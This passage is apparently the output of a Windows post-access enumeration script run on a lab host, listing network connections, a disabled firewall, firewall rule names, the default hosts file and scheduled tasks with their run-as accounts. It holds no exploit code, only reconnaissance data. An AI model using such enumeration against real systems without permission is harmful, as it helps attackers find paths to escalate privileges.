  239.255.255.250       01-00-5e-7f-ff-fa     static


-----------------------------------------------------------
 NetStat
-----------------------------------------------------------

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1612
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       728
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1528
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1436
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       580
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       588
  TCP    10.10.10.134:22        10.10.14.28:35022      ESTABLISHED     1612
  TCP    10.10.10.134:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:22                [::]:0                 LISTENING       1612
  TCP    [::]:135               [::]:0                 LISTENING       728
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       472
  TCP    [::]:49665             [::]:0                 LISTENING       888
  TCP    [::]:49666             [::]:0                 LISTENING       880
  TCP    [::]:49667             [::]:0                 LISTENING       1528
  TCP    [::]:49668             [::]:0                 LISTENING       1436
  TCP    [::]:49669             [::]:0                 LISTENING       580
  TCP    [::]:49670             [::]:0                 LISTENING       588
  UDP    0.0.0.0:123            *:*                                    404
  UDP    0.0.0.0:500            *:*                                    880
  UDP    0.0.0.0:4500           *:*                                    880
  UDP    0.0.0.0:5050           *:*                                    404
  UDP    0.0.0.0:5353           *:*                                    1032
  UDP    0.0.0.0:5355           *:*                                    1032
  UDP    10.10.10.134:137       *:*                                    4
  UDP    10.10.10.134:138       *:*                                    4
  UDP    127.0.0.1:60788        *:*                                    880
  UDP    [::]:123               *:*                                    404
  UDP    [::]:500               *:*                                    880
  UDP    [::]:4500              *:*                                    880
  UDP    [::]:5353              *:*                                    1032
  UDP    [::]:5355              *:*                                    1032


-----------------------------------------------------------
 Firewall Status
-----------------------------------------------------------

Firewall is Disabled

-----------------------------------------------------------
 FireWall Rules
-----------------------------------------------------------

Name
----
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudE...
@{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudE...
@{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/Pack...
@{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/Pack...
Core Networking - Packet Too Big (ICMPv6-In)
File and Printer Sharing (Echo Request - ICMPv4-In)
File and Printer Sharing (Echo Request - ICMPv4-In)
File and Printer Sharing (Echo Request - ICMPv6-In)
File and Printer Sharing (Echo Request - ICMPv6-In)
File and Printer Sharing (Spooler Service - RPC-EPMAP)
File and Printer Sharing (Spooler Service - RPC-EPMAP)
Cast to Device streaming server (RTCP-Streaming-In)
Cast to Device streaming server (RTCP-Streaming-In)
Cast to Device streaming server (RTCP-Streaming-In)
Cast to Device streaming server (RTSP-Streaming-In)
Cast to Device streaming server (RTSP-Streaming-In)
Cast to Device streaming server (RTSP-Streaming-In)
File and Printer Sharing (Spooler Service - RPC)
File and Printer Sharing (Spooler Service - RPC)
AllJoyn Router (TCP-In)
AllJoyn Router (UDP-In)
Cast to Device functionality (qWave-TCP-In)
Cast to Device functionality (qWave-UDP-In)
Cast to Device SSDP Discovery (UDP-In)
Core Networking - Dynamic Host Configuration Protocol (DHCP-In)
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
Core Networking - Teredo (UDP-In)
File and Printer Sharing (LLMNR-UDP-In)
File and Printer Sharing (LLMNR-UDP-In)
File Server Remote Management (DCOM-In)
File Server Remote Management (WMI-In)
mDNS (UDP-In)
Network Discovery (LLMNR-UDP-In)
Network Discovery (LLMNR-UDP-In)
Network Discovery (Pub-WSD-In)
Network Discovery (Pub-WSD-In)
Network Discovery (SSDP-In)
Network Discovery (SSDP-In)
Network Discovery (WSD-In)
Network Discovery (WSD-In)
Cast to Device streaming server (HTTP-Streaming-In)
Cast to Device streaming server (HTTP-Streaming-In)
Cast to Device streaming server (HTTP-Streaming-In)
Cast to Device UPnP Events (TCP-In)
Core Networking - Destination Unreachable (ICMPv6-In)
Core Networking - Destination Unreachable Fragmentation Needed (ICMPv4-In)
Core Networking - Internet Group Management Protocol (IGMP-In)
Core Networking - IPHTTPS (TCP-In)
Core Networking - IPv6 (IPv6-In)
Core Networking - Multicast Listener Done (ICMPv6-In)
Core Networking - Multicast Listener Query (ICMPv6-In)
Core Networking - Multicast Listener Report (ICMPv6-In)
Core Networking - Multicast Listener Report v2 (ICMPv6-In)
Core Networking - Neighbor Discovery Advertisement (ICMPv6-In)
Core Networking - Neighbor Discovery Solicitation (ICMPv6-In)
Core Networking - Parameter Problem (ICMPv6-In)
Core Networking - Router Advertisement (ICMPv6-In)
Core Networking - Router Solicitation (ICMPv6-In)
Core Networking - Time Exceeded (ICMPv6-In)
DIAL protocol server (HTTP-In)
DIAL protocol server (HTTP-In)
File and Printer Sharing (NB-Datagram-In)
File and Printer Sharing (NB-Datagram-In)
File and Printer Sharing (NB-Name-In)
File and Printer Sharing (NB-Name-In)
File and Printer Sharing (NB-Session-In)
File and Printer Sharing (NB-Session-In)
File and Printer Sharing (SMB-In)
File and Printer Sharing (SMB-In)
File Server Remote Management (SMB-In)
Network Discovery (NB-Datagram-In)
Network Discovery (NB-Datagram-In)
Network Discovery (NB-Name-In)
Network Discovery (NB-Name-In)
Network Discovery (UPnP-In)
Network Discovery (UPnP-In)
Network Discovery (WSD Events-In)
Network Discovery (WSD Events-In)
Network Discovery (WSD EventsSecure-In)
Network Discovery (WSD EventsSecure-In)
Windows Remote Management (HTTP-In)
Windows Remote Management (HTTP-In)
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources...
@{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/Display...
@{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/Display...
@{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}
@{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}
@{Microsoft.Windows.Apprep.ChxApp_1000.14393.2273.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.Chx...
@{Microsoft.Windows.Apprep.ChxApp_1000.14393.2828.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.Chx...
@{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudE...
@{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudE...
@{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/Pack...
@{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/Pack...
@{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellE...
@{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellE...
@{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resou...
@{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resou...
@{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resou...
Connected User Experiences and Telemetry
Core Networking - Multicast Listener Done (ICMPv6-Out)
Core Networking - Multicast Listener Query (ICMPv6-Out)
Core Networking - Multicast Listener Report (ICMPv6-Out)
Core Networking - Multicast Listener Report v2 (ICMPv6-Out)
Core Networking - Neighbor Discovery Advertisement (ICMPv6-Out)
Core Networking - Neighbor Discovery Solicitation (ICMPv6-Out)
Core Networking - Packet Too Big (ICMPv6-Out)
Core Networking - Parameter Problem (ICMPv6-Out)
Core Networking - Router Advertisement (ICMPv6-Out)
Core Networking - Router Solicitation (ICMPv6-Out)
Core Networking - Time Exceeded (ICMPv6-Out)
File and Printer Sharing (Echo Request - ICMPv4-Out)
File and Printer Sharing (Echo Request - ICMPv4-Out)
File and Printer Sharing (Echo Request - ICMPv6-Out)
File and Printer Sharing (Echo Request - ICMPv6-Out)
Core Networking - Group Policy (LSASS-Out)
Cast to Device streaming server (RTP-Streaming-Out)
Cast to Device streaming server (RTP-Streaming-Out)
Cast to Device streaming server (RTP-Streaming-Out)
AllJoyn Router (TCP-Out)
AllJoyn Router (UDP-Out)
Cast to Device functionality (qWave-TCP-Out)
Cast to Device functionality (qWave-UDP-Out)
Core Networking - DNS (UDP-Out)
Core Networking - Dynamic Host Configuration Protocol (DHCP-Out)
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)
Core Networking - Group Policy (TCP-Out)
Core Networking - IPHTTPS (TCP-Out)
Core Networking - Teredo (UDP-Out)
File and Printer Sharing (LLMNR-UDP-Out)
File and Printer Sharing (LLMNR-UDP-Out)
mDNS (UDP-Out)
Network Discovery (LLMNR-UDP-Out)
Network Discovery (LLMNR-UDP-Out)
Network Discovery (Pub WSD-Out)
Network Discovery (Pub WSD-Out)
Network Discovery (SSDP-Out)
Network Discovery (SSDP-Out)
Network Discovery (UPnPHost-Out)
Network Discovery (UPnPHost-Out)
Network Discovery (WSD-Out)
Network Discovery (WSD-Out)
Core Networking - Group Policy (NP-Out)
Core Networking - Internet Group Management Protocol (IGMP-Out)
Core Networking - IPv6 (IPv6-Out)
File and Printer Sharing (NB-Datagram-Out)
File and Printer Sharing (NB-Datagram-Out)
File and Printer Sharing (NB-Name-Out)
File and Printer Sharing (NB-Name-Out)
File and Printer Sharing (NB-Session-Out)
File and Printer Sharing (NB-Session-Out)
File and Printer Sharing (SMB-Out)
File and Printer Sharing (SMB-Out)
Network Discovery (NB-Datagram-Out)
Network Discovery (NB-Datagram-Out)
Network Discovery (NB-Name-Out)
Network Discovery (NB-Name-Out)
Network Discovery (UPnP-Out)
Network Discovery (UPnP-Out)
Network Discovery (WSD Events-Out)
Network Discovery (WSD Events-Out)
Network Discovery (WSD EventsSecure-Out)
Network Discovery (WSD EventsSecure-Out)


-----------------------------------------------------------
 Hosts File Content
-----------------------------------------------------------

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost


-----------------------------------------------------------
 Processes
-----------------------------------------------------------

-----------------------------------------------------------
 Scheduled Tasks
-----------------------------------------------------------
Current System Time: 05/13/2021 23:36:00

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (A
              utomated)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (A
              utomated)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (M
              anual)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\PolicyConverter
Run As User : SYSTEM
Task To Run : %windir%\system32\appidpolicyconverter.exe

TaskName    : \Microsoft\Windows\AppID\SmartScreenSpecific
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck
Run As User : LOCAL SERVICE
Task To Run : %windir%\system32\appidcertstorecheck.exe

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe

TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe -maintenance

TaskName    : \Microsoft\Windows\Application Experience\StartupAppTask
Run As User : INTERACTIVE
Task To Run : %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask

TaskName    : \Microsoft\Windows\ApplicationData\appuriverifierdaily
Run As User : INTERACTIVE
Task To Run : %windir%\system32\AppHostRegistrationVerifier.exe

TaskName    : \Microsoft\Windows\ApplicationData\appuriverifierinstall
Run As User : INTERACTIVE
Task To Run : %windir%\system32\AppHostRegistrationVerifier.exe

TaskName    : \Microsoft\Windows\ApplicationData\appuriverifierinstall
Run As User : INTERACTIVE
Task To Run : %windir%\system32\AppHostRegistrationVerifier.exe

TaskName    : \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState

TaskName    : \Microsoft\Windows\ApplicationData\DsSvcCleanup
Run As User : SYSTEM
Task To Run : %windir%\system32\dstokenclean.exe

TaskName    : \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask

TaskName    : \Microsoft\Windows\Autochk\Proxy
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations

TaskName    : \Microsoft\Windows\Bluetooth\UninstallDeviceTask
Run As User : SYSTEM
Task To Run : BthUdTask.exe $(Arg0)

TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\wsqmcons.exe

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$

TaskName    : \Microsoft\Windows\Device Information\Device
Run As User : SYSTEM
Task To Run : %windir%\system32\devicecensus.exe

TaskName    : \Microsoft\Windows\Device Information\Device
Run As User : SYSTEM
Task To Run : %windir%\system32\devicecensus.exe

TaskName    : \Microsoft\Windows\Diagnosis\Scheduled
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\DiskCleanup\SilentCleanup
Run As User : Users
Task To Run : %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART

TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
Run As User : Users
Task To Run : %windir%\system32\DFDWiz.exe

TaskName    : \Microsoft\Windows\DiskFootprint\Diagnostics
Run As User : SYSTEM
Task To Run : %windir%\system32\disksnapshot.exe -z

TaskName    : \Microsoft\Windows\DiskFootprint\StorageSense
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\EDP App Launch Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\EDP Auth Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\ErrorDetails\EnableErrorDetailsUpdate
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\ErrorDetails\ErrorDetailsUpdate
Run As User : NETWORK SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Location\Notifications
Run As User : Authenticated Users
Task To Run : %windir%\System32\LocationNotificationWindows.exe

TaskName    : \Microsoft\Windows\Location\WindowsActionDialog
Run As User : Authenticated Users
Task To Run : %windir%\System32\WindowsActionDialog.exe

TaskName    : \Microsoft\Windows\Maintenance\WinSAT
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Maps\MapsToastTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Maps\MapsUpdateTask
Run As User : NETWORK SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\MbaeParserTask.exe

TaskName    : \Microsoft\Windows\MUI\LPRemove
Run As User : SYSTEM
Task To Run : %windir%\system32\lpremove.exe

TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo
Run As User : Users
Task To Run : %windir%\system32\gatherNetworkInfo.vbs

TaskName    : \Microsoft\Windows\Offline Files\Background Synchronization
Run As User : Authenticated Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Offline Files\Logon Synchronization
Run As User : Authenticated Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\PLA\Server Manager Performance Monitor
Run As User : SYSTEM
Task To Run : %systemroot%\system32\rundll32.exe %systemroot%\system32\pla.dll,PlaHost Server Manager Performance Monitor" "$(A
              rg0)""

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Group Policy
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Plug and Play Cleanup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Sysprep Generalize Drivers
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\drvinst.exe 6

TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\RecoveryEnvironment\VerifyWinRE
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)

TaskName    : \Microsoft\Windows\Server Manager\ServerManager
Run As User : Administrators
Task To Run : %windir%\system32\ServerManagerLauncher.exe

TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SettingSync\BackgroundUploadTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SettingSync\BackupTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SettingSync\NetworkStateChangeTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SettingSync\NetworkStateChangeTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Shell\CreateObjectTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Shell\IndexerAutomaticMaintenance
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Software Inventory Logging\Collection
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish

TaskName    : \Microsoft\Windows\Software Inventory Logging\Configuration
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure

TaskName    : \Microsoft\Windows\SpacePort\SpaceAgentTask
Run As User : SYSTEM
Task To Run : %windir%\system32\SpaceAgent.exe

TaskName    : \Microsoft\Windows\SpacePort\SpaceAgentTask
Run As User : SYSTEM
Task To Run : %windir%\system32\SpaceAgent.exe

TaskName    : \Microsoft\Windows\SpacePort\SpaceManagerTask
Run As User : SYSTEM
Task To Run : %windir%\system32\spaceman.exe /Work

TaskName    : \Microsoft\Windows\SpacePort\SpaceManagerTask
Run As User : SYSTEM
Task To Run : %windir%\system32\spaceman.exe /Work

TaskName    : \Microsoft\Windows\Speech\SpeechModelDownloadTask
Run As User : NETWORK SERVICE
Task To Run : %windir%\system32\speech_onecore\common\SpeechModelDownload.exe

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -g -# -m 8 -i 13500

TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Time Synchronization\ForceSynchronizeTime
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Run As User : SYSTEM
Task To Run : %windir%\system32\tzsync.exe

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Maintenance Install
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartInstall

TaskName    : \Microsoft\Windows\UpdateOrchestrator\MusUx_UpdateInterval
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe Display

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Policy Install
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartInstall

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Reboot
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe RebootDialog

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Refresh Settings
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe RefreshSettings

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Resume On Boot
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe ResumeUpdate

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Run As User : INTERACTIVE
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Run As User : INTERACTIVE
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Run As User : INTERACTIVE
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Run As User : INTERACTIVE
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Run As User : INTERACTIVE
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe Display

TaskName    : \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_ReadyToReboot
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe ReadyToReboot

TaskName    : \Microsoft\Windows\UPnP\UPnPHostConfig
Run As User : SYSTEM
Task To Run : sc.exe config upnphost start= auto

TaskName    : \Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance
Run As User : SYSTEM
Task To Run : C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1902.2-0\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintena
              nce

TaskName    : \Microsoft\Windows\Windows Defender\Windows Defender Cleanup
Run As User : SYSTEM
Task To Run : C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1902.2-0\MpCmdRun.exe -IdleTask -TaskName WdCleanup

TaskName    : \Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan
Run As User : SYSTEM
Task To Run : C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1902.2-0\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55

TaskName    : \Microsoft\Windows\Windows Defender\Windows Defender Verification
Run As User : SYSTEM
Task To Run : C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1902.2-0\MpCmdRun.exe -IdleTask -TaskName WdVerification

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

